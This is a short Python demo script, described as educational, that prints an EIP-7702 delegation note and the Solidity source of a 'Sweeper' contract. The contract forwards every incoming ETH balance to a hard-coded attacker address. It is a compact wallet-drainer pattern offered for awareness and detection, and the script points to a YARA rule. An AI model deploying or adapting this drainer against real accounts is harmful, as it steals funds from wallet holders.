#!/usr/bin/env python3
"""EIP-7702 sweep concept demo (educational only)."""

DRAINER_SOL = "// SPDX-License-Identifier: MIT\n" \
    "pragma solidity ^0.8.24;\n" \
    "contract Sweeper {\n" \
    "    address payable constant ATTACKER =\n" \
    "        payable(0x000000000000000000000000000000000000dEaD);\n" \
    "    receive()  external payable { ATTACKER.transfer(address(this).balance); }\n" \
    "    fallback() external payable { ATTACKER.transfer(address(this).balance); }\n" \
    "}"

DELEGATION_NOTE = (
    "EIP-7702 delegation: EOA --authorization--> Sweeper\n"
    "Subsequent transfer(EOA) => Sweeper.receive() sweeps balance.\n"
)

def main():
    print(DELEGATION_NOTE)
    print(DRAINER_SOL)
    print("[!] CONCEPT ONLY. Do not deploy.")
    print("[*] Detection rule: defense/detection-rules/yara_eip7702.yar")

if __name__ == "__main__":
    main()
